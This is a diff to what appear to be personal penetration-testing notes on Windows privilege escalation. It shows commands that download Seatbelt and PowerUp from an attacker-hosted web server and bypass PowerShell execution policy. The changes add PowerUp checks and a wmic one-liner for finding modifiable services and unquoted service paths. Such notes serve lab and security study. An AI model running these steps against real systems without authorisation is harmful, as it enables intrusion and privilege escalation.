@@ -27,7 +27,7 @@ iwr -uri http://192.168.118.2/Seatbelt.exe -Outfile Seatbelt.exe
 .\Seatbelt.exe -group=all
 ```
 ### PowerUp.ps1
-Nb. This tool (like most) should not be trusted implicitly always and if it offers no/insufficient usable information then manual techniques should be employed.
+Explicitly a Windows enumeration and privesc tool. Nb. This tool (like most) should not be trusted implicitly always and if it offers no/insufficient usable information then manual techniques should be employed.
 ```bash
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
 python3 -m http.server 80
@@ -36,7 +36,14 @@ python3 -m http.server 80
 iwr -uri http://<our IP>/PowerUp.ps1 -Outfile PowerUp.ps1
 powershell -ep bypass
 . .\PowerUp.ps1
+```
+To find Binaries that run with privilege that can be modified:
+```powershell
 Get-ModifiableServiceFile
+```
+To find exploitable unquoted service paths:
+```powershell
+Get-UnquotedService
 ```
 
 Look upon our exploitable shit ye mighty and despair!
@@ -157,3 +164,9 @@ Mask to permissions mapping (nb. A preceding 'I' indicates the access right is i
 - RX 	Read and execute access
 - R 	Read-only access
 - W 	Write-only access
+
+### Unquoted Service Paths
+Again, this will run in `cmd` or `Powershell`:
+```cmd
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
